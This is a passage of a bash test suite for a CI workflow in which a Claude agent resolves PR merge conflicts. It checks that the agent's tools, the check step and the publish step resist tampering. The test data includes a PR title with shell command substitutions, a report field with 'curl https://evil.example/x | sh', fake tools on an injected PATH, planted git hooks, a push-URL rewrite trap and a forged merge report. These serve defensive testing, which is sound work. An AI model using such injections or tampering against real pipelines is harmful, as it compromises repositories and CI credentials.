  commit_file cfg.c "$(printf '%s\n' '/* 1 */' '/* two */' 'static int s_cfg = 1;' '/* 4 */')" "X' (#6)" >/dev/null
  publish_fixture p2
}
CASE_NAME=fixture-c-control
fixture_drift drift-offline
run_detect
assert_eq "$(outv stacked)" false "stacked without the API signal (control: patch-id must miss a drifted squash)"

CASE_NAME=fixture-c
fixture_drift drift
echo '[{"number": 6, "merged_at": "2026-09-30T10:00:00Z", "base": {"ref": "main"}}, {"number": 7, "merged_at": null, "base": {"ref": "main"}}]' > "$STUB_DIR/pulls/$X.json"
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" true "stacked"
assert_eq "$(outv signal)" api "signal"
assert_eq "$(outv ancestors)" 6 "ancestor PRs"
assert_eq "$(outv last_equivalent)" "$X" "last_equivalent"

# The same commit merged through a PR into ANOTHER branch (release, backport)
# is not on this base: not stacked.
CASE_NAME=fixture-c-other-base
fixture_drift drift-other-base
echo '[{"number": 5, "merged_at": "2026-09-30T10:00:00Z", "base": {"ref": "release/1.x"}}, {"number": 7, "merged_at": null, "base": {"ref": "main"}}]' > "$STUB_DIR/pulls/$X.json"
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" false "stacked (merged into a different base)"
assert_eq "$(outv ancestors)" "" "ancestor PRs"

# A failing API must warn and fall through to the git signals, never decide.
CASE_NAME=api-error
fixture_single api-error
touch "$STUB_DIR/pulls-error"
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" true "stacked (via the git fallback)"
assert_eq "$(outv signal)" cherry "signal (the git fallback, not the API)"
assert_contains "$(cat "$C/stdout")" "::warning" "API failure warning"

# (d) ordinary conflict, no shared change: not stacked.
fixture_conflict() {
  new_case "$1"
  commit_file x.c "$(printf '%s\n' 'static int s_cfg = 0;' 'int main(void) { return s_cfg; }')" A >/dev/null
  g checkout -q -b feature
  commit_file x.c "$(printf '%s\n' 'static int s_cfg = 1;' 'int main(void) { return s_cfg; }')" feat >/dev/null
  g checkout -q main
  commit_file x.c "$(printf '%s\n' 'static int s_cfg = 2;' 'int main(void) { return s_cfg; }')" base >/dev/null
  publish_fixture feature
}
CASE_NAME=fixture-d
fixture_conflict plain
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" false "stacked"
assert_eq "$(outv last_equivalent)" "" "last_equivalent"

CASE_NAME=api-error-plain
fixture_conflict api-error-plain
touch "$STUB_DIR/pulls-error"
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" false "stacked (an API error alone decides nothing)"
assert_eq "$(outv last_equivalent)" "" "last_equivalent"

# (e) every branch commit is already upstream (cherry-picked onto main).
CASE_NAME=fixture-e
new_case upstream
commit_file a.c 'int a = 0;' A >/dev/null
g checkout -q -b feature
X=$(commit_file a.c 'int a = 1;' X)
g checkout -q main
commit_file b.c 'int b = 0;' B >/dev/null
g cherry-pick "$X" >/dev/null
publish_fixture feature
run_detect
assert_eq "$(outv stacked)" true "stacked"
assert_eq "$(outv last_equivalent)" "$X" "last_equivalent"

# (f) a hotfix cherry-picked into the middle of the branch is also on main,
#     but it is not a leading run: `rebase --onto` past it would drop the
#     branch's own earlier work, so this is an ordinary conflict.
CASE_NAME=fixture-f
new_case midstream
commit_file a.c 'int a = 0;' A >/dev/null
commit_file b.c 'int b = 0;' B >/dev/null
g checkout -q -b feature
commit_file a.c 'int a = 1;' own >/dev/null
g checkout -q main
H=$(commit_file b.c 'int b = 1;' hotfix)
g checkout -q feature
g cherry-pick "$H" >/dev/null
g checkout -q main
commit_file a.c 'int a = 2;' base >/dev/null
publish_fixture feature
run_detect
assert_eq "$RC" 0 "detect exit ($(stderr_tail))"
assert_eq "$(outv stacked)" false "stacked"
assert_eq "$(outv last_equivalent)" "" "last_equivalent"

# ------------------------------------------------- the agent's prompt / tools
CASE_NAME=claude-prompt
fixture_conflict prompt
hostile='Fix `touch PWNED-bt` $(touch PWNED-cs) & ${HOME} @@BASE_BRANCH@@ \1'
run_body claude CLAUDE_CODE_OAUTH_TOKEN=x "PR_TITLE=$hostile" HEAD_BRANCH=feature BASE_BRANCH=main \
  CONFLICTED_FILES=x.c "BUILD_COMMAND=cc -fsyntax-only x.c"
assert_eq "$RC" 0 "Claude step exit ($(stderr_tail))"
prompt="$(cat "$STUB_DIR/npx.prompt" 2>/dev/null || true)"
assert_contains "$prompt" "PR #7: \"$hostile\"" "prompt carries the title verbatim"
assert_contains "$prompt" "cc -fsyntax-only x.c" "prompt names the build command"
assert_contains "$prompt" "$C/tmp/auto-resolve-agent/abort.md" "prompt names the abort file"
assert_contains "$prompt" "keep exactly one copy" "prompt dedup guidance"
ok; if grep -qE '@@[A-Z_]+@@' <<<"${prompt//"$hostile"/}"; then fail "unsubstituted placeholder left in the prompt"; fi
ok; if ls "$W"/PWNED-* "$C"/PWNED-* >/dev/null 2>&1; then fail "the title was executed"; fi
args="$(cat "$STUB_DIR/npx.args" 2>/dev/null || true)"
assert_lacks "$args" "git push" "CLI --allowedTools"
assert_lacks "$args" "Bash(gh" "CLI --allowedTools"
assert_contains "$args" "Bash(git commit *)" "CLI --allowedTools"
# The agent's only extra directory is one of its own: RUNNER_TEMP also holds
# the runner's file-command files (GITHUB_ENV, GITHUB_PATH, GITHUB_OUTPUT).
add_dirs="$(awk 'p { print; p = 0 } $0 == "--add-dir" { p = 1 }' "$STUB_DIR/npx.args" 2>/dev/null || true)"
assert_eq "$add_dirs" "$C/tmp/auto-resolve-agent" "the agent's --add-dir"
ok; [ -d "$C/tmp/auto-resolve-agent" ] && [ -z "$(ls -A "$C/tmp/auto-resolve-agent")" ] ||
  fail "the agent's directory exists and holds nothing (no prompt, no template)"

# ------------------------------------------- check, build and publish
# Every case: detect, the shipped merge step, the agent's action (simulated),
# the check step, then the report crosses to the build and publish jobs.
start_merge() { # <case>
  fixture_conflict "$1"
  run_detect
  PRE_HEAD=$(outv pre_head) BASE_SHA=$(outv base_sha)
  run_body merge BASE_BRANCH=main HEAD_BRANCH=feature
  cp "$C/output" "$C/merge.out"
  assert_eq "$(outv has_conflicts)" true "merge step has_conflicts"
  assert_eq "$(outv conflicted_files)" x.c "merge step conflicted_files"
}
resolve_as() { # <content>: what the agent writes, stages and commits
  printf '%s\n' "$1" > "$W/x.c"
  g add x.c
  g commit -q --no-edit
}
check_after_agent() { # [VAR=value ...]: the check step after a merge
  run_check ATTEMPTED=false MERGE_OUTCOME=success AGENT_OUTCOME=success \
    "HAS_CONFLICTS=$(outv has_conflicts "$C/merge.out")" \
    "CONFLICTED_FILES=$(outv conflicted_files "$C/merge.out")" "CONFIG_SHA=$(outv config_sha "$C/merge.out")" "$@"
  CHECK_RC=$RC
}
# run_build <command>: the build job, in a fresh clone checked out at PRE_HEAD.
run_build() {
  git clone -q "$ORIGIN" "$C/b" 2>/dev/null
  git -C "$C/b" checkout -q --detach "$PRE_HEAD"
  transfer "$C/btmp"
  run_in "$C/b" read-build RUNNER_TEMP="$C/btmp"
  run_in "$C/b" build RUNNER_TEMP="$C/btmp" "OUTCOME=$(outv outcome)" "MERGE=$(outv merge)" "BUILD_COMMAND=$1"
  rm -rf "$C/pub/auto-resolve-build"
  cp -r "$C/btmp/auto-resolve-build" "$C/pub/"
}
# run_publish [VAR=value ...]: the publish job's read + publish steps, run
# from $W so that anything left in the resolve repository is in reach.
run_publish() {
  run_read
  run_in "$W" publish GH_TOKEN=x PUSH_TOKEN=x HEAD_BRANCH=feature BASE_BRANCH=main CROSS_REPO=false \
    RUNNER_TEMP="$C/pub" GITHUB_SERVER_URL="file://$C" "OUTCOME=$R_OUTCOME" "REASON=$R_REASON" \
    "PRE_HEAD=$R_PRE_HEAD" "BASE_SHA=$R_BASE_SHA" "MERGE=$R_MERGE" "$@"
}
GOOD="$(printf '%s\n' 'static int s_cfg = 2;' 'int main(void) { return s_cfg; }')"
DUPED="$(printf '%s\n' 'static int s_cfg = 1;' 'static int s_cfg = 2;' 'int main(void) { return s_cfg; }')"
BUILD='cc -fsyntax-only x.c'
not_pushed() {
  assert_eq "$(pushes)" 0 "pushes"
  assert_eq "$(remote_head feature)" "$PRE_HEAD" "origin/feature untouched"
}
unresolved_case() { # <reason>: check reports it, publish comments once and pushes nothing
  assert_eq "$CHECK_RC" 0 "check exit ($(stderr_tail))"
  assert_eq "$(outv outcome "$C/check.out")" unresolved "check outcome"
  run_publish HAS_PAT=true BUILD_COMMAND=
  assert_eq "$R_REASON" "$1" "report reason"
  ok; [ "$RC" -ne 0 ] || fail "publish must fail for '$1'"
  not_pushed
  assert_eq "$(comments)" 1 "unresolved comments"
  assert_contains "$(cat "$STUB_DIR/comment.1" 2>/dev/null)" "<!-- auto-resolve-conflicts:unresolved head=$PRE_HEAD base=$BASE_SHA reason=$1" "marker"
}

CASE_NAME=markers
start_merge markers
g add x.c && g commit -q --no-edit
check_after_agent
unresolved_case markers

CASE_NAME=wrong-parents
start_merge wrong-parents
g merge --abort
g commit -q --allow-empty -m "not a merge"
check_after_agent
unresolved_case parents

CASE_NAME=aborted
start_merge aborted
g merge --abort
mkdir -p "$C/tmp/auto-resolve-agent"
echo 'x.c: both sides set s_cfg; needs a product decision.' > "$C/tmp/auto-resolve-agent/abort.md"
check_after_agent
assert_eq "$(outv outcome "$C/check.out")" unresolved "check outcome"
run_publish HAS_PAT=true BUILD_COMMAND=
assert_eq "$RC" 0 "abort exit ($(stderr_tail))"
not_pushed
assert_eq "$(comments)" 1 "abort comments"
assert_contains "$(cat "$STUB_DIR/comment.1" 2>/dev/null)" "needs a product decision" "abort comment carries the agent's reason"
assert_contains "$(cat "$STUB_DIR/comment.1" 2>/dev/null)" "<!-- auto-resolve-conflicts:unresolved head=$PRE_HEAD base=$BASE_SHA" "abort comment marker"
run_publish HAS_PAT=true BUILD_COMMAND=
assert_eq "$(comments)" 1 "abort comments after a second run (marker dedup)"
CASE_NAME=prior
run_body prior GH_TOKEN=x EVENT_NAME=push "PRE_HEAD=$PRE_HEAD" "BASE_SHA=$BASE_SHA"
assert_eq "$(outv attempted)" true "a reported (head, base) pair skips the agent"
run_body prior GH_TOKEN=x EVENT_NAME=push "PRE_HEAD=$PRE_HEAD" "BASE_SHA=0000000000000000000000000000000000000000"
assert_eq "$(outv attempted)" false "a new base retries"
run_body prior GH_TOKEN=x EVENT_NAME=workflow_dispatch "PRE_HEAD=$PRE_HEAD" "BASE_SHA=$BASE_SHA"
assert_eq "$(outv attempted)" false "a manual run retries a reported pair"

CASE_NAME=unfinished
start_merge unfinished
check_after_agent
unresolved_case unfinished

# The agent step itself failed (outage, expired token, npx): no comment, no
# marker, red; the next run retries.
CASE_NAME=agent-failure
start_merge agent-failure
check_after_agent AGENT_OUTCOME=failure
assert_eq "$CHECK_RC" 0 "check exit ($(stderr_tail))"
assert_eq "$(outv outcome "$C/check.out")" agent-error "check outcome"
run_publish HAS_PAT=true BUILD_COMMAND=
ok; [ "$RC" -ne 0 ] || fail "an agent failure must fail the job"
not_pushed
assert_eq "$(comments)" 0 "comments for an agent failure"
run_body prior GH_TOKEN=x EVENT_NAME=push "PRE_HEAD=$PRE_HEAD" "BASE_SHA=$BASE_SHA"
assert_eq "$(outv attempted)" false "an agent failure does not block the next run"

# The agent (or a prompt injection) rewires the repository config: refuse.
CASE_NAME=config-tamper
start_merge config-tamper
resolve_as "$GOOD"
g config --local core.hooksPath "$C/hooks"
check_after_agent
unresolved_case config

CASE_NAME=dirty-tree
start_merge dirty-tree
resolve_as "$GOOD"
echo leftover > "$W/scratch.txt"
check_after_agent
unresolved_case dirty

# The job's PATH was extended (a GITHUB_PATH write) with a directory holding a
# fake git/jq: the check step must not run them.
CASE_NAME=path-tamper
start_merge path-tamper
resolve_as "$GOOD"
mkdir -p "$C/evil"
for t in git jq sha256sum; do
  printf '#!/bin/sh\ntouch "%s/EVIL-RAN-%s"\nPATH=%s exec %s "$@"\n' "$C" "$t" "$work/bin:$PATH" "$t" > "$C/evil/$t"
  chmod +x "$C/evil/$t"
done
check_after_agent "PATH=$C/evil:$work/bin:$PATH"
assert_eq "$CHECK_RC" 0 "check exit ($(stderr_tail))"
assert_eq "$(outv outcome "$C/check.out")" resolved "check outcome"
ok; if ls "$C"/EVIL-RAN-* >/dev/null 2>&1; then fail "the check step ran a tool from an injected PATH entry: $(ls "$C" | grep EVIL-RAN | tr '\n' ' ')"; fi

# The incident: both copies kept, the build catches the redefinition.
CASE_NAME=incident
start_merge incident
resolve_as "$DUPED"
check_after_agent
assert_eq "$(outv outcome "$C/check.out")" resolved "check outcome (structurally fine)"
run_build "$BUILD"
ok; [ "$RC" -ne 0 ] || fail "a failing build-command must fail the build job"
assert_eq "$(jq -r .passed "$C/pub/auto-resolve-build/build.json" 2>/dev/null)" false "build result"
run_publish HAS_PAT=true "BUILD_COMMAND=$BUILD"
ok; [ "$RC" -ne 0 ] || fail "a failed build must fail publish"
not_pushed
assert_eq "$(comments)" 1 "build-failure comments"
c1="$(cat "$STUB_DIR/comment.1" 2>/dev/null || true)"
assert_contains "$c1" "<!-- auto-resolve-conflicts:unresolved head=$PRE_HEAD base=$BASE_SHA reason=build-failed" "build-failure marker"
assert_contains "$c1" "redefinition" "build-failure comment carries the compiler output"
run_publish HAS_PAT=true "BUILD_COMMAND=$BUILD"
assert_eq "$(comments)" 1 "build-failure comments after a second run (marker dedup)"

# build-command set but the build job never produced a result: no push.
CASE_NAME=no-build-result
start_merge no-build-result
resolve_as "$GOOD"
check_after_agent
run_publish HAS_PAT=true "BUILD_COMMAND=$BUILD"
ok; [ "$RC" -ne 0 ] || fail "a missing build result must fail publish"
not_pushed
assert_eq "$(comments)" 0 "comments without a build result"

# Passing build: one push, one comment. Hooks and config left in the resolve
# repository ($W, publish's working directory here) play no part in the push.
CASE_NAME=pass
start_merge pass
resolve_as "$GOOD"
check_after_agent
assert_eq "$(outv outcome "$C/check.out")" resolved "check outcome"
run_build "$BUILD"
assert_eq "$RC" 0 "build exit ($(stderr_tail))"
for h in pre-push reference-transaction post-update; do
  printf '#!/bin/sh\ntouch "%s/HOOK-RAN-%s"\n' "$C" "$h" > "$W/.git/hooks/$h"
  chmod +x "$W/.git/hooks/$h"
done
# The rewrite base ends in a slash, so a push that honoured it would land in
# $C/trap/octo/fixture.git (and the assertion below would see it).
git init -q --bare "$C/trap/octo/fixture.git"
g config --local "url.file://$C/trap/.pushInsteadOf" "file://$C/"
run_publish HAS_PAT=true "BUILD_COMMAND=$BUILD"
assert_eq "$RC" 0 "publish exit ($(stderr_tail))"
assert_eq "$(pushes)" 1 "pushes"
assert_contains "$(cat "$STUB_DIR/push.log")" "$R_MERGE:refs/heads/feature" "push refspec"
assert_eq "$(remote_head feature)" "$(g rev-parse HEAD)" "origin/feature is the merge"
ok; if ls "$C"/HOOK-RAN-* >/dev/null 2>&1; then fail "a hook from the resolve repository ran during publish"; fi
assert_eq "$(git --git-dir="$C/trap/octo/fixture.git" for-each-ref | wc -l | tr -d ' ')" 0 "the resolve repository's url rewrite was not used"
assert_eq "$(comments)" 1 "comments"
c1="$(cat "$STUB_DIR/comment.1" 2>/dev/null || true)"
assert_contains "$c1" "$R_MERGE" "comment names the pushed SHA"
assert_contains "$c1" "$BUILD" "comment names the build that validated it"
assert_lacks "$(cat "$C/stdout")" "::warning" "no warning with a PAT and a build"

# The PR branch moved after the merge was made: push nothing, quietly.
CASE_NAME=branch-moved
start_merge branch-moved
resolve_as "$GOOD"
check_after_agent
moved=$(git --git-dir="$ORIGIN" commit-tree -p "$PRE_HEAD" -m moved "$PRE_HEAD^{tree}")
git --git-dir="$ORIGIN" update-ref refs/heads/feature "$moved"
run_publish HAS_PAT=true BUILD_COMMAND=
assert_eq "$RC" 0 "publish exit ($(stderr_tail))"
assert_eq "$(pushes)" 0 "pushes"
assert_eq "$(remote_head feature)" "$moved" "origin/feature keeps the new commit"

# A report from a compromised resolve job: it names the live PR head, but
# the exported merge sits on another commit. publish re-checks and refuses.
CASE_NAME=forged-report
start_merge forged-report
g merge --abort
Z=$(commit_file x.c 'int evil;' evil)
g merge -q origin/main -X theirs -m merge >/dev/null 2>&1
M=$(g rev-parse HEAD)
g update-ref refs/auto-resolve/merge "$M"
mkdir -p "$C/tmp/auto-resolve-report"
g bundle create -q "$C/tmp/auto-resolve-report/resolution.bundle" refs/auto-resolve/merge --not "$BASE_SHA" "$PRE_HEAD"
jq -n --arg p "$PRE_HEAD" --arg b "$BASE_SHA" --arg m "$M" \
  '{pr: "7", outcome: "resolved", reason: "", pre_head: $p, base_sha: $b, merge: $m, equivalent: "", last_equivalent: "", ancestors: "", signal: ""}' \
  > "$C/tmp/auto-resolve-report/report.json"
: > "$C/tmp/auto-resolve-report/detail.txt"
run_publish HAS_PAT=true BUILD_COMMAND=
assert_eq "$R_OUTCOME" resolved "forged report passes the reader (well-formed)"
ok; [ "$RC" -ne 0 ] || fail "a merge whose first parent ($Z) is not the PR head must be refused"
not_pushed

# Fork PR at publish time: never pushed to a same-named branch here.
CASE_NAME=cross-repo
start_merge cross-repo
resolve_as "$GOOD"
check_after_agent
run_publish HAS_PAT=true BUILD_COMMAND= CROSS_REPO=true
ok; [ "$RC" -ne 0 ] || fail "a cross-repository PR must not be pushed"
not_pushed

# The report reader rejects a malformed or foreign report.
CASE_NAME=report-reader
R="$C/tmp/auto-resolve-report/report.json"
cp "$R" "$C/report.good"
run_read
assert_eq "$RC" 0 "read exit, good report ($(stderr_tail))"
assert_eq "$(cut -d= -f1 "$C/read.out" | paste -sd, -)" "outcome,reason,pre_head,base_sha,merge,equivalent,last_equivalent,ancestors,signal" "keys the reader writes"
# An extra key with a newline would append a second merge= line after the
# checked one, and the runner keeps the last value for a key.
for mutation in '.merge = "HEAD"' '.pr = "8"' '.outcome = "pushed"' '.reason = "markers"' '.signal = "x\ny"' '.pre_head = "--upload-pack=x"' \
  '.zz = "x\nmerge=HEAD; curl https://evil.example/x | sh #"' '.extra = ""'; do
  jq "$mutation" "$C/report.good" > "$R"
  run_read
  ok; [ "$RC" -ne 0 ] || fail "reader accepted a report with $mutation"
  assert_lacks "$(cat "$C/read.out")" "evil.example" "outputs written for a report with $mutation"
done
cp "$C/report.good" "$R"

# The PR's head is the repository's default branch, or a protected one, or
# its protection cannot be read: publish pushes nothing (find-conflicts
# filters these; publish re-checks against the live repository settings).
for guard in default protected lookup-error repo-error; do
  CASE_NAME=head-guard-$guard
  start_merge "head-guard-$guard"
  resolve_as "$GOOD"
  check_after_agent
  case "$guard" in
    default) echo feature > "$STUB_DIR/default_branch" ;;
    protected) echo feature > "$STUB_DIR/protected" ;;
    lookup-error) touch "$STUB_DIR/branches-error" ;;
    repo-error) touch "$STUB_DIR/repo-error" ;;
  esac
  run_publish HAS_PAT=true BUILD_COMMAND=
  ok; [ "$RC" -ne 0 ] || fail "publish must fail rather than push to a $guard head"
  not_pushed
  assert_eq "$(comments)" 0 "comments"
done

# GITHUB_TOKEN push, no build: pushes, but says loudly that nothing built it.
CASE_NAME=no-pat
start_merge no-pat
resolve_as "$GOOD"
check_after_agent
run_publish HAS_PAT=false BUILD_COMMAND=
assert_eq "$RC" 0 "publish exit ($(stderr_tail))"
assert_eq "$(pushes)" 1 "pushes"
assert_contains "$(cat "$C/stdout")" "::warning" "GITHUB_TOKEN push warning"
c1="$(cat "$STUB_DIR/comment.1" 2>/dev/null || true)"
assert_contains "$c1" "GITHUB_TOKEN" "comment names the credential"
assert_contains "$c1" "no CI" "comment says CI did not run"
assert_contains "$c1" "Nothing compiled" "comment says nothing built it"

echo
if [ "$failures" -gt 0 ]; then
  printf 'FAILED: %d of %d checks\n' "$failures" "$checks"
  exit 1
fi
printf 'PASS: %d checks\n' "$checks"
